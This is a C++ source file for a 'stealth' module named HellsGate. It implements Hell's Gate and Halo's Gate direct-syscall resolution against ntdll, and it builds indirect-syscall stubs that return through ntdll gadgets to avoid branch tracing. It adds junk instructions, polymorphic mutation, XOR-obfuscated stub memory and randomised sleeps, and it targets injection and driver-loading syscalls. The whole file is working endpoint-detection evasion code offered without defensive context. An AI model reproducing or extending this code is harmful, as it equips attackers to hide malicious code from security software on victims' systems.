#include <diarna/compiler_port.hpp>
#include <diarna/stealth/hells_gate.hpp>
#include <diarna/stealth/polymorph.hpp>

#include <winternl.h>
#include <algorithm>
#include <cstring>

#include <obfuscation/obfusheader.h>

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040UL
#endif
#ifndef ViewUnmap
#define ViewUnmap 2
#endif

namespace diarna::stealth {

static const char* ALL_SYSCALLS[] = {
    "NtAllocateVirtualMemory","NtWriteVirtualMemory","NtReadVirtualMemory",
    "NtProtectVirtualMemory","NtCreateThreadEx","NtOpenProcess",
    "NtQuerySystemInformation","NtClose","NtQueueApcThread",
    "NtGetContextThread","NtSetContextThread","NtResumeThread",
    "NtSuspendThread","NtUnmapViewOfSection","NtCreateSection",
    "NtMapViewOfSection","NtQueryInformationProcess","NtSetInformationProcess",
    "NtCreateProcessEx","NtOpenThread","NtAlertThread",
    "NtWaitForSingleObject","NtDelayExecution","NtYieldExecution",
    "NtCreateFile","NtReadFile","NtWriteFile","NtDeleteFile",
    "NtDeviceIoControlFile","NtSetInformationFile","NtQueryInformationFile",
    "NtCreateKey","NtOpenKey","NtSetValueKey","NtQueryValueKey",
    "NtDeleteKey","NtDeleteValueKey","NtEnumerateKey","NtEnumerateValueKey",
    "NtQueryDirectoryFile","NtCreateUserProcess","NtTerminateProcess",
    "NtQuerySystemTime","NtQueryPerformanceCounter",
    "NtFreeVirtualMemory","NtFlushInstructionCache",
    "NtQueryVirtualMemory","NtLockVirtualMemory","NtUnlockVirtualMemory",
    "NtSetDebugFilterState","NtSystemDebugControl",
    "NtRaiseHardError","NtDisplayString","NtShutdownSystem",
    "NtLoadDriver","NtUnloadDriver","NtSetSystemInformation",
    "NtQuerySystemEnvironmentValue","NtQuerySystemEnvironmentValueEx",
    "NtCreateEvent","NtOpenEvent","NtSetEvent","NtResetEvent",
    "NtCreateMutant","NtOpenMutant","NtReleaseMutant",
    "NtCreateSemaphore","NtOpenSemaphore","NtReleaseSemaphore",
    "NtCreateTimer","NtOpenTimer","NtSetTimer","NtCancelTimer",
    "NtCreateIoCompletion","NtOpenIoCompletion","NtSetIoCompletion",
    "NtRemoveIoCompletion","NtQueryIoCompletion",
    "NtCreatePort","NtConnectPort","NtReplyPort","NtAcceptConnectPort",
    "NtCompleteConnectPort","NtRequestPort","NtRequestWaitReplyPort",
    "NtCreateWaitCompletionPacket","NtAssociateWaitCompletionPacket",
    "NtCancelWaitCompletionPacket","NtPowerInformation",
    "NtQuerySecurityObject","NtSetSecurityObject",
    "NtCreateDirectoryObject","NtOpenDirectoryObject",
    "NtQueryDirectoryObject","NtCreateSymbolicLinkObject",
    "NtOpenSymbolicLinkObject","NtQuerySymbolicLinkObject",
};

static constexpr size_t ALL_SYSCALLS_COUNT = sizeof(ALL_SYSCALLS) / sizeof(ALL_SYSCALLS[0]);

HellsGate& HellsGate::instance() {
    static HellsGate gate; return gate;
}

HellsGate::HellsGate() : stub_region_(nullptr), initialized_(false) {
#ifdef _M_AMD64
    is_wow64_ = false;
#else
    BOOL wow64 = FALSE; IsWow64Process(GetCurrentProcess(), &wow64);
    is_wow64_ = wow64;
#endif
}

HellsGate::~HellsGate() {
    if (stub_region_) PolymorphicEngine::instance().metamorphic_free(stub_region_);
}

uint32_t HellsGate::djb2_hash(const char* str) {
    uint32_t h = 5381;
    while (*str) { h = ((h << 5) + h) + (uint8_t)*str++; }
    return h;
}

uint32_t HellsGate::ror13_hash(const char* str) {
    uint32_t h = 0;
    while (*str) {
        h = (h >> 13) | (h << 19);
        h += (uint8_t)*str++;
    }
    return h;
}

uint32_t HellsGate::fnv1a_hash(const char* str) {
    uint32_t h = 0x811C9DC5;
    while (*str) { h ^= (uint8_t)*str++; h *= 0x01000193; }
    return h;
}

static uint32_t fnv1a_hash_bytes(const uint8_t* data, size_t len) {
    uint32_t h = 0x811C9DC5;
    for (size_t i = 0; i < len; ++i) { h ^= data[i]; h *= 0x01000193; }
    return h;
}

bool HellsGate::initialize() {
    if (initialized_) return true;
    INDIRECT_BRANCH;

    Sleep((DWORD)(__rdtsc() % 50) + 20);

    bool ok = resolve_from_disk();
    if (!ok) ok = resolve_from_memory();
    if (!ok) ok = resolve_using_pattern_walk();
    if (!ok) ok = resolve_using_halos_gate(0);

    if (!ok) return false;

    Sleep((DWORD)(__rdtsc() % 30) + 10);

    generate_x64_stubs();
    if (is_wow64_) generate_wow64_stubs();

    Sleep((DWORD)(__rdtsc() % 20) + 5);

    obfuscate_stub_region();
    initialized_ = true;
    last_full_refresh_ = std::chrono::steady_clock::now();
    return true;
}

bool HellsGate::resolve_from_disk() {
    INDIRECT_BRANCH;

    wchar_t sys_path[MAX_PATH];
    GetSystemDirectoryW(sys_path, MAX_PATH);
    wcscat_s(sys_path, L"\\ntdll.dll");

    HANDLE file = CreateFileW(sys_path, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file == INVALID_HANDLE_VALUE) return false;

    DWORD file_size = GetFileSize(file, nullptr);
    if (file_size == INVALID_FILE_SIZE || file_size == 0) { CloseHandle(file); return false; }

    HANDLE mapping = CreateFileMappingW(file, nullptr, PAGE_READONLY, 0, 0, nullptr);
    if (!mapping) { CloseHandle(file); return false; }

    uint8_t* base = (uint8_t*)MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
    if (!base) { CloseHandle(mapping); CloseHandle(file); return false; }

    auto* dos = (IMAGE_DOS_HEADER*)base;
    auto* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    auto* exports_rva = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    auto* exports = (IMAGE_EXPORT_DIRECTORY*)(base + exports_rva->VirtualAddress);

    uint32_t* names = (uint32_t*)(base + exports->AddressOfNames);
    uint16_t* ordinals = (uint16_t*)(base + exports->AddressOfNameOrdinals);
    uint32_t* functions = (uint32_t*)(base + exports->AddressOfFunctions);

    syscalls_.clear();
    ssn_index_.clear();
    hash_index_.clear();

    for (size_t i = 0; i < ALL_SYSCALLS_COUNT; ++i) {
        const char* target = ALL_SYSCALLS[i];
        bool found = false;

        for (DWORD j = 0; j < exports->NumberOfNames && !found; ++j) {
            const char* ename = (const char*)(base + names[j]);
            if (strcmp(ename, target) == 0) {
                uint16_t ordinal = ordinals[j];
                uint32_t rva = functions[ordinal];
                uint8_t* func_data = base + rva;

                uint16_t ssn = 0;
                for (int k = 0; k < 32 && !ssn; ++k) {
                    if (func_data[k] == 0xB8 && k + 4 < 32) {
                        ssn = *(uint16_t*)(func_data + k + 1);
                    }
                    if (func_data[k] == 0x4C && func_data[k+1] == 0x8B &&
                        func_data[k+2] == 0xD1 && k + 6 < 32 &&
                        func_data[k+3] == 0xB8) {
                        ssn = *(uint16_t*)(func_data + k + 4);
                    }
                }

                if (ssn > 0) {
                    StoredSyscall sc;
                    sc.ssn = ssn;
                    sc.hash = fnv1a_hash(target);
                    sc.name = target;
                    sc.x64_stub = nullptr;
                    sc.wow64_stub = nullptr;
                    sc.validated = true;
                    syscalls_.push_back(sc);
                    ssn_index_[ssn] = &syscalls_.back();
                    hash_index_[sc.hash] = &syscalls_.back();
                    found = true;
                }
            }
        }
    }

    UnmapViewOfFile(base);
    CloseHandle(mapping);
    CloseHandle(file);
    return !syscalls_.empty();
}

bool HellsGate::resolve_from_memory() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    auto* dos = (IMAGE_DOS_HEADER*)ntdll;
    auto* nt = (IMAGE_NT_HEADERS*)((uint8_t*)ntdll + dos->e_lfanew);
    auto* exports = (IMAGE_EXPORT_DIRECTORY*)(
        (uint8_t*)ntdll + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    uint32_t* names = (uint32_t*)((uint8_t*)ntdll + exports->AddressOfNames);
    uint16_t* ordinals = (uint16_t*)((uint8_t*)ntdll + exports->AddressOfNameOrdinals);
    uint32_t* functions = (uint32_t*)((uint8_t*)ntdll + exports->AddressOfFunctions);

    // Sort by function RVA to find syscall numbers in order
    std::vector<std::pair<uint32_t, const char*>> sorted;
    for (DWORD i = 0; i < exports->NumberOfNames; ++i) {
        const char* name = (const char*)((uint8_t*)ntdll + names[i]);
        if (strncmp(name, "Nt", 2) == 0 || strncmp(name, "Zw", 2) == 0) {
            sorted.push_back({functions[ordinals[i]], name});
        }
    }
    std::sort(sorted.begin(), sorted.end());

    syscalls_.clear();
    ssn_index_.clear();
    hash_index_.clear();

    uint16_t current_ssn = 0;
    for (size_t i = 1; i < sorted.size(); ++i) {
        uint32_t rva = sorted[i].first;
        uint32_t prev_rva = sorted[i-1].first;
        uint32_t func_size = rva - prev_rva;

        if (func_size > 10 && func_size < 64) {
            uint8_t* func_data = (uint8_t*)ntdll + prev_rva;
            for (uint32_t j = 0; j < func_size - 4; ++j) {
                if (func_data[j] == 0xB8) {
                    uint16_t ssn = *(uint16_t*)(func_data + j + 1);
                    if (ssn >= current_ssn && ssn < 0x1000) {
                        current_ssn = ssn;
                        StoredSyscall sc;
                        sc.ssn = ssn;
                        sc.hash = fnv1a_hash(sorted[i-1].second);
                        sc.name = sorted[i-1].second;
                        sc.x64_stub = nullptr;
                        sc.validated = true;
                        syscalls_.push_back(sc);
                        ssn_index_[ssn] = &syscalls_.back();
                        hash_index_[sc.hash] = &syscalls_.back();
                    }
                    break;
                }
            }
        }
    }

    return !syscalls_.empty();
}

bool HellsGate::resolve_using_pattern_walk() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    MODULEINFO mi;
    GetModuleInformation(GetCurrentProcess(), ntdll, &mi, sizeof(mi));

    uint8_t pattern[] = {0x4C, 0x8B, 0xD1, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3};
    uint8_t* base = (uint8_t*)mi.lpBaseOfDll;
    size_t size = mi.SizeOfImage;

    std::vector<std::pair<uint16_t, uint8_t*>> found_stubs;

    for (size_t i = 0; i < size - sizeof(pattern); ++i) {
        if (base[i] == 0x4C && base[i+1] == 0x8B && base[i+2] == 0xD1 &&
            base[i+3] == 0xB8 && base[i+8] == 0x0F && base[i+9] == 0x05 &&
            base[i+10] == 0xC3) {
            uint16_t ssn = *(uint16_t*)(base + i + 4);
            found_stubs.push_back({ssn, base + i});
        }
    }

    std::sort(found_stubs.begin(), found_stubs.end());

    syscalls_.clear();
    for (auto& [ssn, stub] : found_stubs) {
        StoredSyscall sc;
        sc.ssn = ssn;
        sc.hash = fnv1a_hash(("NtZw" + std::to_string(ssn)).c_str());
        sc.name = "Unknown_" + std::to_string(ssn);
        sc.x64_stub = stub;
        sc.validated = true;
        syscalls_.push_back(sc);
        ssn_index_[ssn] = &syscalls_.back();
    }

    return !syscalls_.empty();
}

bool HellsGate::resolve_using_halos_gate(uint16_t starting_ssn) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    // Halos Gate: Find a neighboring syscall's stub, compute our SSN as offset from it
    MODULEINFO mi;
    GetModuleInformation(GetCurrentProcess(), ntdll, &mi, sizeof(mi));
    uint8_t* base = (uint8_t*)mi.lpBaseOfDll;

    auto* dos = (IMAGE_DOS_HEADER*)base;
    auto* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    auto* exports = (IMAGE_EXPORT_DIRECTORY*)(
        base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    uint32_t* names = (uint32_t*)(base + exports->AddressOfNames);
    uint16_t* ordinals = (uint16_t*)(base + exports->AddressOfNameOrdinals);
    uint32_t* functions = (uint32_t*)(base + exports->AddressOfFunctions);

    // Find NtAllocateVirtualMemory as anchor at a known SSN (~0x18 on Win10)
    for (DWORD i = 0; i < exports->NumberOfNames; ++i) {
        const char* name = (const char*)(base + names[i]);
        if (strcmp(name, "NtAllocateVirtualMemory") == 0) {
            uint32_t rva = functions[ordinals[i]];
            uint8_t* func = base + rva;

            for (int j = 0; j < 32; ++j) {
                if (func[j] == 0xB8) {
                    uint16_t anchor_ssn = *(uint16_t*)(func + j + 1);

                    // Now resolve all targets relative to anchor
                    for (size_t k = 0; k < ALL_SYSCALLS_COUNT; ++k) {
                        for (DWORD l = 0; l < exports->NumberOfNames; ++l) {
                            if (strcmp((const char*)(base + names[l]), ALL_SYSCALLS[k]) == 0) {
                                uint32_t target_rva = functions[ordinals[l]];
                                int32_t rva_diff = (int32_t)(target_rva - rva);
                                uint16_t estimated_ssn = anchor_ssn + (uint16_t)(rva_diff / 32);

                                StoredSyscall sc;
                                sc.ssn = estimated_ssn;
                                sc.hash = fnv1a_hash(ALL_SYSCALLS[k]);
                                sc.name = ALL_SYSCALLS[k];
                                sc.x64_stub = nullptr;
                                sc.validated = true;
                                syscalls_.push_back(sc);
                                ssn_index_[estimated_ssn] = &syscalls_.back();
                                hash_index_[sc.hash] = &syscalls_.back();
                                break;
                            }
                        }
                    }
                    return !syscalls_.empty();
                }
            }
        }
    }
    return false;
}

static void* find_ntdll_syscall_ret_gadget() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return nullptr;
    MODULEINFO mi;
    GetModuleInformation(GetCurrentProcess(), ntdll, &mi, sizeof(mi));
    uint8_t* base = (uint8_t*)mi.lpBaseOfDll;

    auto* dos = (IMAGE_DOS_HEADER*)base;
    auto* nt_hdr = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    auto* sec = IMAGE_FIRST_SECTION(nt_hdr);
    uintptr_t text_start = 0, text_end = 0;
    for (WORD s = 0; s < nt_hdr->FileHeader.NumberOfSections; ++s) {
        if (memcmp(sec[s].Name, ".text", 5) == 0) {
            text_start = (uintptr_t)base + sec[s].VirtualAddress;
            text_end = text_start + sec[s].Misc.VirtualSize;
            break;
        }
    }
    if (!text_start) { text_start = (uintptr_t)base; text_end = text_start + mi.SizeOfImage; }

    for (uintptr_t addr = text_start; addr < text_end - 3; ++addr) {
        if (*(uint8_t*)addr == 0x0F && *(uint8_t*)(addr+1) == 0x05 && *(uint8_t*)(addr+2) == 0xC3)
            return (void*)addr;
    }

    static const char* fallback_funcs[] = {
        "NtQuerySystemTime", "NtYieldExecution", "NtClose",
        "NtQueryPerformanceCounter", "NtTestAlert"
    };
    for (auto* name : fallback_funcs) {
        auto* func = (uint8_t*)GetProcAddress(ntdll, name);
        if (!func) continue;
        for (int k = 0; k < 64; ++k) {
            if (func[k] == 0x0F && func[k+1] == 0x05 && func[k+2] == 0xC3)
                return func + k;
        }
    }
    return nullptr;
}

static void* find_ntdll_ret_gadget() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return nullptr;
    MODULEINFO mi;
    GetModuleInformation(GetCurrentProcess(), ntdll, &mi, sizeof(mi));
    auto* dos = (IMAGE_DOS_HEADER*)ntdll;
    auto* nt_hdrs = (IMAGE_NT_HEADERS*)((uint8_t*)ntdll + dos->e_lfanew);
    auto* sec = IMAGE_FIRST_SECTION(nt_hdrs);
    for (int i = 0; i < nt_hdrs->FileHeader.NumberOfSections; ++i) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            uint8_t* start = (uint8_t*)ntdll + sec[i].VirtualAddress;
            size_t sz = sec[i].Misc.VirtualSize;
            for (size_t j = 0; j < sz; ++j) {
                if (start[j] == 0xC3) return start + j;
            }
        }
    }
    return nullptr;
}

void HellsGate::generate_x64_stubs() {
    void* gadget = find_ntdll_syscall_ret_gadget();
    void* ret_gadget = find_ntdll_ret_gadget();

    size_t count = syscalls_.size();
    stub_region_size_ = count * STUB_SIZE + 4096;
    stub_region_ = PolymorphicEngine::instance().metamorphic_alloc(stub_region_size_, true);
    if (!stub_region_) return;

    memset(stub_region_, 0xCC, stub_region_size_);

    auto& poly = PolymorphicEngine::instance();
    std::mt19937_64 rng(__rdtsc());

    for (size_t i = 0; i < count; ++i) {
        auto& sc = syscalls_[i];
        uint8_t* stub = (uint8_t*)stub_region_ + i * STUB_SIZE;
        size_t pos = 0;

        if (i > 0 && (i % 10) == 0) Sleep((DWORD)(rng() % 5) + 1);

        uint32_t seed = (uint32_t)rng() ^ sc.ssn;

        static const uint8_t junk_ops[] = {
            0x90, 0x66, 0x90, 0x0F, 0x1F, 0x00, 0x0F, 0x1F, 0x40, 0x00,
            0x0F, 0x1F, 0x44, 0x00, 0x00
        };
        int junk_len = (seed % 2) * ((seed >> 4) & 1 ? 1 : 2);
        for (int j = 0; j < junk_len && pos < STUB_SIZE - 36; ++j)
            stub[pos++] = junk_ops[(seed + j * 7) % 15];

        stub[pos++] = 0x4C; stub[pos++] = 0x8B; stub[pos++] = 0xD1;

        if ((seed >> 8) & 1) {
            stub[pos++] = 0x66; stub[pos++] = 0x90;
        }
        stub[pos++] = 0xB8;
        *(uint16_t*)(stub + pos) = sc.ssn; pos += 2;
        *(uint16_t*)(stub + pos) = 0; pos += 2;

        for (int j = 0; j < (int)(seed % 3); ++j)
            stub[pos++] = 0x90;

        if (gadget && ret_gadget) {
            stub[pos++] = 0x48; stub[pos++] = 0xB8;
            *(uint64_t*)(stub + pos) = (uint64_t)(uintptr_t)ret_gadget; pos += 8;
            stub[pos++] = 0x50; // push rax — [rsp] = ntdll 'ret' gadget addr

            stub[pos++] = 0x48; stub[pos++] = 0xB8;
            *(uint64_t*)(stub + pos) = (uint64_t)(uintptr_t)gadget; pos += 8;
            stub[pos++] = 0x50; // push rax — [rsp] = syscall;ret gadget addr
            stub[pos++] = 0xC3; // ret — pops gadget addr into RIP (no jmp branch trace)
        } else if (gadget) {
            stub[pos++] = 0x48; stub[pos++] = 0xB8;
            *(uint64_t*)(stub + pos) = (uint64_t)(uintptr_t)gadget; pos += 8;
            stub[pos++] = 0x50; // push rax
            stub[pos++] = 0xC3; // ret — transfer via ret, not jmp
        } else {
            stub[pos++] = 0x0F; stub[pos++] = 0x05;
            stub[pos++] = 0xC3;
        }

        while (pos < STUB_SIZE - 1) {
            stub[pos++] = (uint8_t)(0x90 + (seed ^ pos) % 1);
        }

        std::vector<uint8_t> stub_vec(stub, stub + STUB_SIZE);
        auto mutated = poly.generate_polymorphic_stub(stub_vec, 1);
        memcpy(stub, mutated.data(), std::min(mutated.size(), STUB_SIZE));

        sc.x64_stub = stub;
        sc.stub_checksum = fnv1a_hash_bytes((const uint8_t*)stub, STUB_SIZE);
    }

    DWORD old;
    VirtualProtect(stub_region_, stub_region_size_, PAGE_EXECUTE_READ, &old);

    poly.trigger_mutation(stub_region_);
}

void HellsGate::generate_wow64_stubs() {
    size_t total = syscalls_.size() * STUB_SIZE;
    void* region = VirtualAlloc(nullptr, total,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!region) return;

    for (size_t i = 0; i < syscalls_.size(); ++i) {
        auto& sc = syscalls_[i];
        uint8_t* s = (uint8_t*)region + i * STUB_SIZE;
        memset(s, 0xCC, STUB_SIZE);
        s[0] = 0xB8;
        *(uint16_t*)(s + 1) = sc.ssn;
        s[3] = s[4] = 0;
        s[5] = 0x33; s[6] = 0xD2;
        s[7] = 0x64; s[8] = 0xFF; s[9] = 0x15;
        *(uint32_t*)(s + 10) = 0xC0;
        s[14] = 0xC3;
        sc.wow64_stub = s;
    }

    DWORD old;
    VirtualProtect(region, total, PAGE_EXECUTE_READ, &old);
}

uint16_t HellsGate::resolve_hash(uint32_t hash) {
    std::lock_guard lock(syscall_mutex_);
    auto it = hash_index_.find(hash);
    return it != hash_index_.end() ? it->second->ssn : 0;
}

uint16_t HellsGate::resolve_name(const char* name) {
    return resolve_hash(fnv1a_hash(name));
}

static void* get_thread_scratch() {
    thread_local void* tls_scratch = VirtualAlloc(
        nullptr, 64, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    return tls_scratch;
}

void* HellsGate::get_syscall_stub(uint16_t ssn) {
    std::lock_guard lock(syscall_mutex_);
    auto it = ssn_index_.find(ssn);
    if (it == ssn_index_.end()) return nullptr;

    void* raw_stub = is_wow64_ && it->second->wow64_stub ?
        it->second->wow64_stub : it->second->x64_stub;
    if (!raw_stub) return nullptr;

    void* scratch = get_thread_scratch();
    if (!scratch) return nullptr;

    if (stub_obfuscated_) {
        size_t stub_idx = ((uint8_t*)raw_stub - (uint8_t*)stub_region_) / STUB_SIZE;
        deobfuscate_single_stub(stub_idx, (uint8_t*)scratch, STUB_SIZE);
    } else {
        memcpy(scratch, raw_stub, STUB_SIZE);
    }

    return scratch;
}

void* HellsGate::get_syscall_stub_by_hash(uint32_t hash) {
    std::lock_guard lock(syscall_mutex_);
    auto it = hash_index_.find(hash);
    if (it == hash_index_.end()) return nullptr;

    void* raw_stub = is_wow64_ && it->second->wow64_stub ?
        it->second->wow64_stub : it->second->x64_stub;
    if (!raw_stub) return nullptr;

    void* scratch = get_thread_scratch();
    if (!scratch) return nullptr;

    if (stub_obfuscated_) {
        size_t stub_idx = ((uint8_t*)raw_stub - (uint8_t*)stub_region_) / STUB_SIZE;
        deobfuscate_single_stub(stub_idx, (uint8_t*)scratch, STUB_SIZE);
    } else {
        memcpy(scratch, raw_stub, STUB_SIZE);
    }

    return scratch;
}

void* HellsGate::get_syscall_stub_by_name(const char* name) {
    return get_syscall_stub_by_hash(fnv1a_hash(name));
}

void HellsGate::randomize_all_stubs() {
    refresh_syscall_numbers();
    generate_x64_stubs();
    obfuscate_stub_region();
    PolymorphicEngine::instance().mutate_all_active();
    refresh_counter_++;
}

void HellsGate::obfuscate_stub_region() {
    if (!stub_region_) return;
    DWORD old;
    VirtualProtect(stub_region_, stub_region_size_, PAGE_READWRITE, &old);

    uint64_t seed = __rdtsc();
    stub_key_ = (uint32_t)(seed ^ (seed >> 32));
    for (size_t i = 0; i < stub_region_size_; ++i) {
        uint32_t pos_key = stub_key_ ^ (uint32_t)i;
        pos_key = (pos_key * 2654435761u) >> 16;
        ((uint8_t*)stub_region_)[i] ^= (uint8_t)pos_key;
    }

    VirtualProtect(stub_region_, stub_region_size_, PAGE_EXECUTE_READ, &old);
    stub_obfuscated_ = true;
}

void HellsGate::deobfuscate_single_stub(size_t stub_index, uint8_t* out_buf, size_t buf_size) const {
    if (!stub_region_ || !stub_obfuscated_) return;
    size_t offset = stub_index * STUB_SIZE;
    size_t count = (buf_size < STUB_SIZE) ? buf_size : STUB_SIZE;
    const uint8_t* src = (const uint8_t*)stub_region_ + offset;
    for (size_t i = 0; i < count; ++i) {
        uint32_t pos_key = stub_key_ ^ (uint32_t)(offset + i);
        pos_key = (pos_key * 2654435761u) >> 16;
        out_buf[i] = src[i] ^ (uint8_t)pos_key;
    }
}

void HellsGate::deobfuscate_stub_region() {
    if (!stub_region_ || !stub_obfuscated_) return;
    DWORD old;
    VirtualProtect(stub_region_, stub_region_size_, PAGE_READWRITE, &old);

    for (size_t i = 0; i < stub_region_size_; ++i) {
        uint32_t pos_key = stub_key_ ^ (uint32_t)i;
        pos_key = (pos_key * 2654435761u) >> 16;
        ((uint8_t*)stub_region_)[i] ^= (uint8_t)pos_key;
    }

    VirtualProtect(stub_region_, stub_region_size_, PAGE_EXECUTE_READ, &old);
    stub_obfuscated_ = false;
}

bool HellsGate::validate_stub(void* stub, uint16_t expected_ssn) {
    uint8_t* bytes = (uint8_t*)stub;
    for (int i = 0; i < 32; ++i) {
        if (bytes[i] == 0xB8) {
            uint16_t ssn = *(uint16_t*)(bytes + i + 1);
            return ssn == expected_ssn;
        }
    }
    return false;
}

void HellsGate::refresh_syscall_numbers() {
    resolve_from_disk();
    generate_x64_stubs();
    last_full_refresh_ = std::chrono::steady_clock::now();
}

std::vector<HellsGate::SyscallInfo> HellsGate::enumerate_syscalls() const {
    std::vector<SyscallInfo> result;
    std::lock_guard lock(syscall_mutex_);
    for (auto& sc : syscalls_) {
        SyscallInfo info;
        info.ssn = sc.ssn;
        info.name_hash = sc.hash;
        info.name = sc.name;
        info.stub_address = sc.x64_stub;
        info.stub_hash = sc.stub_checksum;
        info.is_wow64_stub = sc.wow64_stub != nullptr;
        result.push_back(info);
    }
    return result;
}

bool HellsGate::is_stub_tainted(void* stub) {
    if (!stub) return false;
    uint8_t* bytes = (uint8_t*)stub;
    uint32_t hash = fnv1a_hash_bytes(bytes, STUB_SIZE);
    std::lock_guard lock(syscall_mutex_);
    for (auto& sc : syscalls_) {
        if (sc.x64_stub == stub || sc.wow64_stub == stub)
            return sc.stub_checksum != hash;
    }
    return true;
}

} // namespace diarna::stealth
